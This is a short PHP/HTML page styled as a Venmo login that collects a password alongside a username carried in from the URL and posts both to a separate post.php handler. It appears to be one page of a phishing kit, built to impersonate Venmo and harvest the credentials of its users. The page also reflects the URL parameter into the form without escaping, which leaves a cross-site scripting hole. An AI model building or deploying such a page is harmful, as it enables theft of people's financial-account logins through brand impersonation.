<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Venmo</title>
</head>
<body>

<main>
    <div class="form">
        <div>
            <img src="res/img/logo.png" >
        </div>
        <form action="post.php" method="post">
        <p class="header"> Log in</p>
         <div class="col">
         <input type="hidden" name="user" value="<?php echo @$_GET['user']; ?>">
           <input type="password"  placeholder="Password"name="pass" required>  
         </div>
         
         <div class="a">
            <a href="#">Forgot password?
            </a>

         </div>


         <div class="but">
            <button type="submit">Log in</button>
         </div>

         

         <div class="butt">
            <button>Sign up</button>
         </div>






</form>
    </div>
</main>

    
</body>
</html>